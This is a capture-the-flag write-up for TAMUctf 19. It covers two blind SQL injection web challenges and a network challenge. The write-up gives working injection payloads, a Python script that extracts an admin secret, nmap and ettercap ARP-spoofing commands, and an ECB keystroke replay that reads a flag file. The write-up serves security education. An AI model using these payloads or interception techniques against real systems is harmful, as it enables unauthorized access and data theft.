# TAMUctf 19

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190223-tamuctf/) of this writeup.**


 - [TAMUctf 19](#tamuctf-19)
   - [Web](#web)
     - [Bird Box Challenge](#bird-box-challenge)
     - [1337 Secur1ty](#1337-secur1ty)
       - [Failed Attempts](#failed-attempts)
   - [Network/Pentest](#networkpentest)
     - [Copper](#copper)


## Web

### Bird Box Challenge

> bookgin

This is a blind SQL injection challenge.

```
curl "http://web2.tamuctf.com/Search.php?Search='%20or%20''='" -sD -
curl "http://web2.tamuctf.com/Search.php?Search='" -sD -
curl "http://web2.tamuctf.com/Search.php?Search=1" -sD -
```

- SQL syntax error: HTTP 200
- true: HTTP 500 + Nice try, nothing to see here.
- false: HTTP 500 + Our search isn't THAT good...

The HTTP status code is manipulated intentionally.

My payload to retrive all the information:

```
' or (select (select column_name from ((select table_schema,table_name,column_name FROM information_schema.columns where table_schema!='mysql' and table_schema!='information_schema' and table_schema !='sys' and table_schema !='performance_schema') as foo)) like binary "items" ) and ''='
```

- version: `5.7.25-0ubuntu0.18.04.2`
- Database: sqlidb
- Table: Search
- Columns: items
- Rows: `Aggies`, `Trucks`, and `Eggs`

So where is the flag? Hmm... it takes me a few hours to realize that it's hided in the `user()` ....

`gigem{w3_4r3_th3_4ggi3s}@localhost`

### 1337 Secur1ty

> bookgin, KennyTseng


Yey another SQL injnection challenge.

```
http://web6.tamuctf.com/message?id=' or ''='
```

To get the table names and column names first:

```
' or (select (select table_name from ((select table_schema,table_name,column_name FROM information_schema.columns where table_schema!='mysql' and table_schema!='information_schema' and table_schema !='sys' and table_schema !='performance_schema' and table_name != 'Messages' and table_name != 'Users') as foo) limit 1) like "foo%" ) and ''='
```


My script to retrieve admin's secret:

```python
#!/usr/bin/env python3

import requests
s = requests.session()
cookies = dict(userid='3', secret='6IY7TNFKAVT5FNGK')

t = ''
while True:
    for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-.':
        print(t)
        payload = f'''
' or 
(select (select secret from Users where username = "1337-admin") like "{t+i}%")
 and ''='
'''.replace('\n', '')
        r = s.get('http://web6.tamuctf.com/message', params=dict(id=payload), cookies=cookies)
        if 'we need to talk about the cookies' in r.text:
            print(True)
            t+=i
            print(t)
            break
        elif '//' in r.text:
            print(False)
        else:
            print('syntax error')
```

```sh
$ curl 'http://web6.tamuctf.com/' --cookie 'userid=1; secret=WIFHXDZ3BOHJMJSC'

# gigem{th3_T0tp_1s_we4k_w1tH_yoU}
```

#### Failed Attempts

- XSS: No it's not. The message body escapes the html properly.
- SQL injection in registering, editing information, cookies


## Network/Pentest

### Copper

After connect VPN by `sudo openvpn --config copper.ovpn`, I scan the open subnet by `nmap -privileged -v 172.30.0.0/28`.
```
172.30.0.2
8080/tcp open http-proxy

172.30.0.3
```

Then, I use the commands below to catch and format the bridged packets.
```shell
$ ettercap -T -t tcp -M arp:remote /172.30.0.2// /172.30.0.3// -L Sam
$ etterlog -n -s Sam.ecp -F tcp:172.30.0.3:33230:172.30.0.2:6023 >Sam.log.noheader
```

Just a peek over `Sam.log.noheader`
```
YiqMxpZQz+5dPf+qELowBw== 
US5MJOeTx6L69iQT3Y8B9g== 
83jbJmmZc/RUXML8GcGuVg== 
h8zZvECdaFr730Mgo5EgYQ== 
YiqMxpZQz+5dPf+qELowBw== 
RdGNIA97r2yYuQsdXjbQGA== 
S+79/0xJH6oVAqvGSE+Vlw== 
```

Since the problem describe that the user typed the same commands below over and over, I guess they have something to do with the packet captured.
```shell
ls -la
date > monitor.txt
echo "=========================================" >> monitor.txt
echo "ps -aux" >> monitor.txt
ps -aux >> monitor.txt
echo "=========================================" >> monitor.txt
echo "df -h" >> monitor.txt
df -h >> monitor.txt
cp ./monitor.txt /logs
exit
```

Suprisingly, that's true.
```
YiqMxpZQz+5dPf+qELowBw== l
US5MJOeTx6L69iQT3Y8B9g== s
83jbJmmZc/RUXML8GcGuVg== ' '
h8zZvECdaFr730Mgo5EgYQ== -
YiqMxpZQz+5dPf+qELowBw== l
RdGNIA97r2yYuQsdXjbQGA== a
S+79/0xJH6oVAqvGSE+Vlw== <enter>

...
```

Therefore, I construct a mapping from character to HASH. Besides, we can view the content of `monitor.txt` on `http://172.30.0.2:8080/monitor.txt`.
Finally, our payload to get the flag before translated would be
```shell
# Send the hash(payload) to 172.30.0.3:6023
$ cat flag.txt > /logs/h
# If success, we will get response below.
# 92fKIeYPq2HyqG8DSo2Mfw==
```
Then
```shell
$ curl "http://172.30.0.2:8080/h"

# gigem{43s_3cb_b4d_a5c452ed22aa5f1a}
```



